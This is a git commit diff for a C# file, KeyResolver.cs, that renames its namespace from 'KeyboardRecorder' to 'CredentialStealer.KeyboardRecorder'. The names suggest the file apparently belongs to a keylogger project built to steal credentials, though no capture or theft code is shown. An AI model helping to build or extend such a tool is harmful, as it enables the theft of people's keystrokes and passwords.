b53464e5c0a000e871535cda5e1febfc880e44fd
benjamin ohana <ohana.benjamin@gmail.com>
2015-01-15 14:06:00 +0200

    correction namespace

--- KeyboardRecorder/KeyResolver.cs
+++ KeyboardRecorder/KeyResolver.cs
@@ -5,7 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using RamGecTools;
 
-namespace KeyboardRecorder
+namespace CredentialStealer.KeyboardRecorder
 {
     public class KeyResolver
     {
